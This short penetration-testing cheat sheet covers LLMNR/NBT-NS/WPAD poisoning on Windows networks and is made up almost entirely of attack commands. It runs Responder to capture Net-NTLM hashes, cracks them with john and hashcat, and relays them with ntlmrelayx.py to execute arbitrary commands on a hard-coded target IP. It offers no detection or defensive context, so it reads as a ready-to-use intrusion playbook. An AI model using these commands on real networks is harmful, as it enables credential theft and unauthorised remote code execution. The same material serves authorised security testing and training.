# Poisoning

## **Method**

### **Man in The Middle**

*   Perform MiTM attack to gather information

    `responder -I <INTERFACE> -f --lm -w`
* Responder will allow you to catch `Net-NTLMv1/v2` (NTLMv1/v2) hashes that are used for network authentication.
  * `Net-NTLMv1/v2` (NTLMv1/v2) can be used for NTLM-relay but not for Pass The Hash.
  * If you want to target only one IP you need to edit the `RespondDo` from `/etc/responder/Responder.conf`
  * Put `/proc/sys/net/ipv4/ip_forward` at `1` to perform forwarding

### Break hashes grabbed from responder

*   For Net-NTLMv1 format :

    `john --format=netntlm <HASHFILE> --wordlist=<WORDLIST>`

    `hashcat -m 5500 <HASHFILE> <WORDLIST> -o <OUTPUT>`
*   For Net-NTLMv2 format :

    `john --format=netntlmv2 <HASHFILE> --wordlist=<WORDLIST>`

    `hashcat -m 5600 <HASHFILE> <WORDLIST> -o <OUTPUT>`
* NTLM-relay : Relay the Net-NTLMv1/v2 hash of a workstation to authenticate
  * Prerequisites : SMB signing need to be disabled on the targets
  * Use `sudo ntlmrelayx.py -t 31.2.13.227 -c '<COMMAND>'` to start an SMB and an HTTP server.
  * Edit `/etc/responder/Responder.conf` and set to `Off` the SMB and the HTTP server of `responder`
  * Use `sudo responder -I <INTERFACE> -r -d -w -v` to poison WPAD, NBTNS and LLMNR.
